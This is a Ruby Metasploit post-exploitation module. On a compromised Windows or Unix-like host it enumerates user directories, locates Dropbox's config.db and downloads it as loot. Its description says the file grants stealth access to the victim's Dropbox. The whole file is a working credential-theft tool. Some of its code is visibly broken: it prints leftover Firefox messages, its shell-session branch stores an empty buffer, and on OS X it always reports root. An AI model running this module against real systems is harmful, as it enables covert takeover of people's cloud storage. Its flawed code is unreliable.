require 'msf/core'
require 'rex'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Dropbox config dump',
			'Description'    => %q{
			                    This module downloads the Dropbox configuration database from the target system.
                                The database allows stealth access to the victims Dropbox.
                                Works before Dropbox 1.2.0.

                                Further info: http://dereknewton.com/2011/04/dropbox-authentication-static-host-ids/

                                /Based on bannedits Firefox Credential collector/
            },
			'License'        => MSF_LICENSE,
			'Author'         => ['vpb'],
			'Version'        => '',
			'Platform'       => ['windows', 'linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
		#TODO 
        # - Check Dropbox version
		# - Dump host_id from SQLite
        # - Test on UNIX-like systems
	end

	def run
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
                @users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
                @users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error("Unsupported platform #{session.platform}")
			return
		end
		if paths.nil?
			print_error("No users found with a Firefox directory")
			return
		end

		download_loot(paths)
	end


	def enum_users_unix
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			userdirs = session.run_cmd("ls #{home}#{whoami}/.dropbox")
			if userdirs =~ /No such file/i
				return 
			else
				print_status("Found Dropbox profile for: #{whoami}")
				return ["#{home}#{whoami}/.dropbox"] 
			end
		end

		paths = Array.new
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = "#{home}#{dir}" if dir !~ /root/
			print_status("Checking for Dropbox profile in: #{dir}")

			stat = session.run_cmd("ls #{dir}/.dropbox/config.db")
			next if stat =~ /No such file/i
			paths << "#{dir}/.dropbox"
		end
		return paths
	end

	def enum_users_windows
		paths = []

		if got_root?
			session.fs.dir.foreach(@users) do |path|
				next if path =~ /^\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService$/
				dropbox = @users + "\\" + path + @appdata
				dir = check_dropbox(dropbox)
				if dir
					paths << dir
				else
					next
				end
			end
		else # not root
			print_status("We do not have SYSTEM checking #{whoami} account for Firefox")
			path = @users + "\\" + whoami + @appdata
			paths << check_dropbox(path)
		end
		return paths
	end

	def check_dropbox(path)
		paths = []
		path = path + "\\Dropbox\\"
		print_status("Checking for Dropbox directory in: #{path}")

		stat = session.fs.file.stat(path + "\\config.db") rescue return 
		if !stat
			print_error("Dropbox not found")
			return nil
		end

        
        print_good("Dropbox config found!")

		return path
	end

	def download_loot(paths)
		loot = ""
		paths.each do |path|
			if session.type == "meterpreter"
				session.fs.dir.foreach(path) do |file|
					if file =~ /config\.db/
						print_good("Downloading #{file} file from: #{path}")
						file = path + "\\" + file
						fd = session.fs.file.new(file)
						begin
							until fd.eof?
								loot << fd.read
							end
						rescue EOFError
						ensure
							fd.close
						end
					
						file = file.split('\\').last
						store_loot("dropbox.#{file}", "binary/db", session, loot, "dropbox_#{file}", "Dropbox config.db File")
					end
				end
			end
			if session.type != "meterpreter"
				files = session.run_cmd("ls #{path}").gsub(/\s/, "\n")
				files.each_line do |file|
					file.chomp!
					if file =~ /config\.db/ 
						print_good("Downloading #{file}\\")
						data = session.run_cmd("cat #{path}#{file}")
						ext = file.split('.')[2]
						
						file = file.split('/').last
						store_loot("dropbox.#{file}", "binary/db", session, loot, "dropbox_#{file}", "Dropbox config.db File")
					end
				end #foreach
			end #if
		end # foreach
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
        when :osx
            return true # According to Norbert Rittel's comment .dropbox/config.db is 755 on OSX
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			return session.fs.file.expand_path("%USERNAME%")
		else
			return session.run_cmd("whoami").chomp
		end
	end
end
